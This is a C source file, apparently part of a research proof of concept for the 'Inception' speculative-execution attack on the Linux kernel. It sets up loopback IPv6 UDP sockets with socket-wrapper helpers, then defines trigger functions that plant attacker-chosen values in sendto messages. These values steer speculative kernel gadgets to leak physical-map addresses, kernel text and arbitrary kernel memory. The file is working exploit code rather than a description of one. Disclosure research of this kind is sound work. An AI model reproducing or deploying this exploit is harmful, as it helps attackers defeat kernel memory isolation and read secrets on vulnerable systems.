/*
    Some sendto-system call wrapper snippets were copied from retbleed
   (https://github.com/comsec-group/retbleed) and Linux Test Project
   (https://github.com/linux-test-project/ltp)
*/

#define _GNU_SOURCE
#include <ctype.h>
#include <dirent.h>
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <getopt.h>
#include <netinet/in.h>
#include <pthread.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <unistd.h>

int safe_socket(const char *file, const int lineno, void(cleanup_fn)(void), int domain,
                int type, int protocol) {
    int rval, ttype;

    rval = socket(domain, type, protocol);

    if (rval == -1) {
        switch (errno) {
#define TINFO 16 /* Test information flag */
#define TCONF 32 /* Test not appropriate for configuration flag */
#define TBROK 2  /* Test broken flag */
        case EPROTONOSUPPORT:
        case ESOCKTNOSUPPORT:
        case EOPNOTSUPP:
        case EPFNOSUPPORT:
        case EAFNOSUPPORT:
            ttype = TCONF;
            break;
        default:
            ttype = TBROK;
        }
        err(rval, "socket(%d, %d, %d) failed", domain, type, protocol);
    }
    else if (rval < 0) {
        err(rval, "Invalid socket(%d, %d, %d) return value %d", domain, type, protocol,
            rval);
    }
    return rval;
}

#define SAFE_SOCKET(domain, type, protocol)                                              \
    safe_socket(__FILE__, __LINE__, NULL, domain, type, protocol)

int safe_bind(const char *file, const int lineno, void(cleanup_fn)(void), int socket,
              const struct sockaddr *address, socklen_t address_len) {
    int i, ret;
    char buf[128];

    for (i = 0; i < 120; i++) {
        ret = bind(socket, address, address_len);

        if (!ret)
            return 0;

        if (ret != -1) {
            err(ret, "Invalid bind(%d, %d) return value %d", socket, address_len, ret);
        }
        else if (errno != EADDRINUSE) {
            err(ret, "bind(%d, %d) failed", socket, address_len);
        }

        if ((i + 1) % 10 == 0) {
            err(1, "address is in use, waited %3i sec", i + 1);
        }

        sleep(1);
    }

    err(-1, "Failed to bind(%d, %d) after 120 retries", socket, address_len);
    return -1;
}

#define SAFE_BIND(socket, address, address_len)                                          \
    safe_bind(__FILE__, __LINE__, NULL, socket, address, address_len)

int safe_getsockname(const char *file, const int lineno, void(cleanup_fn)(void),
                     int sockfd, struct sockaddr *addr, socklen_t *addrlen) {
    int rval;
    char buf[128];

    rval = getsockname(sockfd, addr, addrlen);

    if (rval == -1) {
        err(rval, "getsockname(%d, %d) failed", sockfd, *addrlen);
    }
    else if (rval) {
        err(rval, "Invalid getsockname(%d, %d) return value %d", sockfd, *addrlen, rval);
    }

    return rval;
}

#define SAFE_GETSOCKNAME(sockfd, addr, addrlen)                                          \
    safe_getsockname(__FILE__, __LINE__, NULL, sockfd, addr, addrlen)

#define MSG_SZ 100

int sdw;
struct sockaddr_in6 addr_init;
socklen_t addrlen_r;
struct sockaddr_in6 addr_r;
char msg[MSG_SZ];

struct in6_addr sin6_addr = IN6ADDR_LOOPBACK_INIT; /* IPv6 address */
void sendto_init() {
    addr_init.sin6_family = AF_INET6;
    addr_init.sin6_port = htons(0);
    addr_init.sin6_addr = sin6_addr;

    int sdr = SAFE_SOCKET(PF_INET6, SOCK_DGRAM | SOCK_CLOEXEC, IPPROTO_IP);
    SAFE_BIND(sdr, (struct sockaddr *) &addr_init, sizeof(addr_init));
    addrlen_r = sizeof(addr_r);
    SAFE_GETSOCKNAME(sdr, (struct sockaddr *) &addr_r, &addrlen_r);
    sdw = SAFE_SOCKET(PF_INET6, SOCK_DGRAM | SOCK_CLOEXEC, IPPROTO_IP);

    /*
        The write below is needed to break further speculation that would distort signal:

        mov    ecx,DWORD PTR [rbx+0x78] --> msg[0x60] ends up in rbx+0x78
        ...
        cmp    ecx,0x1f
        jbe    0xa9b01d74 --> we should prevent this jump, as it introduces unovercomable
       noise in the cache

        Therefore, we should have at least 0x1f + 1 = 0x20 in msg[0x60].
    */
    *(uint8_t *) (msg + 0x60) = 0x20;
}

/*
    Inception specific code:
*/
uint64_t trigger_physmap_load(uint64_t phys_guess) {
    *(uint64_t *) (msg + 0x8) = phys_guess; // Ends up in rbx+0x20
    return sendto(sdw, msg, MSG_SZ, 0, (struct sockaddr *) &addr_r, addrlen_r);
}

uint64_t trigger_physmap_leak(uint64_t phys_guess) {
    *(uint64_t *) (msg + 0x30) = phys_guess; // Ends up in rbx+0x48
    return sendto(sdw, msg, MSG_SZ, 0, (struct sockaddr *) &addr_r, addrlen_r);
}

void trigger_data_leak(uint64_t rb_kva, uint64_t target, uint32_t mask) {
    *(uint32_t *) (msg + 0x5c) = mask;   // Ends up in rbx+0x74
    *(uint64_t *) (msg + 0x48) = rb_kva; // Ends up in rbx+0x60
    *(uint64_t *) (msg + 0x30) = target; // Ends up in rbx+0x48
    sendto(sdw, msg, MSG_SZ, 0, (struct sockaddr *) &addr_r, addrlen_r);
}

void trigger_text_leak(uint64_t target) {
    *(uint64_t *) msg = target - 0x20 + 0x1000;          // Ends up in rbx+0x18
    *(uint64_t *) (msg + 0x18) = target - 0x18 + 0x2000; // Ends up in rbx+0x30
    *(uint64_t *) (msg + 0x40) = target - 0x8;           // Ends up in rbx+0x58
    sendto(sdw, msg, MSG_SZ, 0, (struct sockaddr *) &addr_r, addrlen_r);
}
